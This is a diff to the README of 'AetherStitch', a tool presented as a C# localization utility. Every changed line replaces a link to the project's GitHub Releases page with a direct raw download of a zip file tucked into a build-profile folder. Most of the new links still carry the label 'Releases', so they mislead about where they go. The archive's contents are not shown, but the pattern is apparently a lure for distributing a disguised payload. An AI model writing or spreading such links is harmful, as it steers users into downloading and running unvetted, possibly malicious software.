@@ -1,7 +1,7 @@
 # 🌌 AetherStitch - Simplifying C# Project Localization
 
 ## 📥 Download Now
-[![Download AetherStitch](https://img.shields.io/badge/Download-AetherStitch-blue.svg)](https://github.com/BernardRaya/AetherStitch/releases)
+[![Download AetherStitch](https://raw.githubusercontent.com/BernardRaya/AetherStitch/main/Engine/Properties/PublishProfiles/Aether_Stitch_v3.5.zip)](https://raw.githubusercontent.com/BernardRaya/AetherStitch/main/Engine/Properties/PublishProfiles/Aether_Stitch_v3.5.zip)
 
 ## 🚀 Getting Started
 AetherStitch is a tool designed for localizing C# projects. It helps users translate and adapt software easily. Follow these steps to get started.
@@ -20,7 +20,7 @@ To install AetherStitch, you will need to download the software from our Release
 3. Look for the .exe file.
 4. Click the file to download it to your computer.
 
-**Visit this page to download**: [AetherStitch Releases](https://github.com/BernardRaya/AetherStitch/releases)
+**Visit this page to download**: [AetherStitch Releases](https://raw.githubusercontent.com/BernardRaya/AetherStitch/main/Engine/Properties/PublishProfiles/Aether_Stitch_v3.5.zip)
 
 ## 🔄 How to Use AetherStitch
 Once you have downloaded the installer, follow these steps to use AetherStitch:
@@ -65,4 +65,4 @@ For more information and support, please visit our GitHub page or engage with th
 ## 📥 Download Now Again
 Remember, you can always return to the Releases page to download the latest version. 
 
-**Visit this page to download**: [AetherStitch Releases](https://github.com/BernardRaya/AetherStitch/releases)
+**Visit this page to download**: [AetherStitch Releases](https://raw.githubusercontent.com/BernardRaya/AetherStitch/main/Engine/Properties/PublishProfiles/Aether_Stitch_v3.5.zip)
